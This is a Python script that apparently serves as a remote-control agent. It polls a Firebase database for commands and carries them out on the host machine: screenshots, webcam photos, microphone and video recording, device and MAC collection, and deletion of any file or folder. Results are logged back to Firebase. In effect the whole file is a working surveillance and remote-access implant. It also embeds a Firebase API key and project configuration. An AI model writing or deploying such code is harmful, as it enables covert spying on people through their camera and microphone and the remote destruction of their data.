import os
import time
import json
import platform
import psutil
import pyautogui
import cv2
import sounddevice as sd
import soundfile as sf
import requests
import shutil
import sys
import socket
import uuid
from getmac import get_mac_address
from pathlib import Path
from datetime import datetime
import pyrebase

# ---------------- Firebase Config ----------------
firebaseConfig = {
  "apiKey": "AIzaSyBpKUW9G9XMleeLLnW0F7PFdoEOZc0zLgA",
  "authDomain": "projectmanagement-c7883.firebaseapp.com",
  "databaseURL": "https://projectmanagement-c7883-default-rtdb.firebaseio.com",
  "projectId": "projectmanagement-c7883",
  "storageBucket": "projectmanagement-c7883.firebasestorage.app",
  "messagingSenderId": "907908963007",
  "appId": "1:907908963007:web:310717b4b8d2b839f0840a",
  "measurementId": "G-6YTNV66123"
}

firebase = pyrebase.initialize_app(firebaseConfig)
db = firebase.database()

BASE = Path(__file__).parent
OUT = BASE / "outputs"
OUT.mkdir(exist_ok=True)

def now(): 
    return datetime.utcnow().isoformat() + "Z"

# ---------------- Logging ----------------
def log_to_firebase(command, result, status="done"):
    entry = {
        "command": command,
        "result": result,
        "status": status,
        "timestamp": now(),
        "device": platform.node()
    }
    db.child("logs").push(entry)
    return entry

# ---------------- Command Handlers ----------------
def take_screenshot():
    f = OUT / f"screenshot_{int(time.time())}.png"
    pyautogui.screenshot().save(f)
    return f"Screenshot saved: {f}"

def get_device_info():
    info = {
        "os": platform.system(),
        "release": platform.release(),
        "cpu": platform.processor(),
        "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "ram_available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
        "disk_free_gb": round(psutil.disk_usage('/').free / (1024**3), 2),
        "hostname": platform.node(),
        "mac": get_mac_address()
    }
    return json.dumps(info, indent=2)

def webcam_photo():
    f = OUT / f"webcam_{int(time.time())}.png"
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(str(f), frame)
    cap.release()
    return f"Webcam photo saved: {f}"

def record_audio(duration=3):
    f = OUT / f"audio_{int(time.time())}.wav"
    rec = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
    sd.wait()
    sf.write(str(f), rec, 44100)
    return f"Audio saved: {f}"

def record_video(duration=5):
    f = OUT / f"video_{int(time.time())}.mp4"
    cap = cv2.VideoCapture(0)
    w, h = int(cap.get(3)), int(cap.get(4))
    writer = cv2.VideoWriter(str(f), cv2.VideoWriter_fourcc(*"mp4v"), 20, (w, h))
    for _ in range(20 * duration):
        ret, frame = cap.read()
        if ret:
            writer.write(frame)
    cap.release()
    writer.release()
    return f"Video saved: {f}"

# ---------------- Local Location Snapshot (no API) ----------------
def location_snapshot():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                        for ele in range(0, 8*6, 8)][::-1])
        location_data = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "hostname": hostname,
            "local_ip": local_ip,
            "mac": mac,
            "platform": platform.platform(),
            "note": "This data is collected locally. No external API used."
        }
        f = BASE / "location.json"
        with open(f, "w") as fh:
            json.dump(location_data, fh, indent=2)
        return json.dumps(location_data, indent=2)
    except Exception as e:
        return f"Location error: {e}"

# ---------------- Delete Path ----------------
def delete_path(path):
    p = Path(path).expanduser()
    print(f"Deleting path: {p}")
    if not p.exists():
        return "Path not found"
    try:
        if p.is_file():
            p.unlink()
            return f"File deleted: {p}"
        if p.is_dir():
            shutil.rmtree(p)
            return f"Folder deleted: {p}"
    except Exception as e:
        return f"Delete failed: {e}"
    return "Unknown target"

# ---------------- Executor ----------------
def execute_command(command):
    if command == "screenshot": return take_screenshot()
    if command == "deviceinfo": return get_device_info()
    if command == "webcam_photo": return webcam_photo()
    if command == "record_audio": return record_audio()
    if command == "record_video": return record_video()
    if command == "location_snapshot": return location_snapshot()
    if command.startswith("delete "):
        path = command.split(" ", 1)[1]
        return delete_path(path)
    return f"Unknown command: {command}"

# ---------------- Firebase Listener ----------------
def stream_handler(message):
    print("🔍 Firebase update received:", message)
    try:
        task = db.child("task").get().val()
        if not task: 
            return
        command = task.get("command", "")
        if not command: 
            return

        print(f"⚡ Received command: {command}")
        result = execute_command(command)

        db.child("task").update({
            "last_result": result,
            "last_executed": now(),
            "command": ""   # clear after execution
        })
        log_to_firebase(command, result)
    except Exception as e:
        print("Error executing command:", e)

# ---------------- CLI Argument Support ----------------
if len(sys.argv) > 1:
    cmd = sys.argv[1]
    if cmd == "delete" and len(sys.argv) > 2:
        print(delete_path(sys.argv[2]))
        sys.exit(0)
    else:
        print(execute_command(cmd))
        sys.exit(0)

# ---------------- Main Listener ----------------
if __name__ == "__main__":
    print("Agent started. Listening for Firebase tasks...")
    my_stream = db.child("task").stream(stream_handler)
